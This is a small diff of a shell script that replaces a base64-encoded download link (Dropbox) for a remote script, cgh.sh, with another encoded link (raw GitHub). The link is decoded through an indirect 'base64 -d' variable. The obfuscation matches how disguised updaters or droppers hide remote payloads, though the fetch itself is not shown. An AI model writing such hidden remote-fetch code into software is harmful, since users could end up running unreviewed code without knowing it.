@@ -106,7 +106,7 @@ return
 clear
 
 update_pak
-update1='aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vcy92eWl5bWQ2dXozZXRvbGwvY2doLnNo'
+update1='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0VWQUlBaGlxbmhhaWphaS9ub3Zhai9NYXN0ZXIvZW5zYXlhci9jZ2gvY2doLnNo'
 dom='base64 -d'
 RE=$(echo $update1|$dom)
 sleep 2s
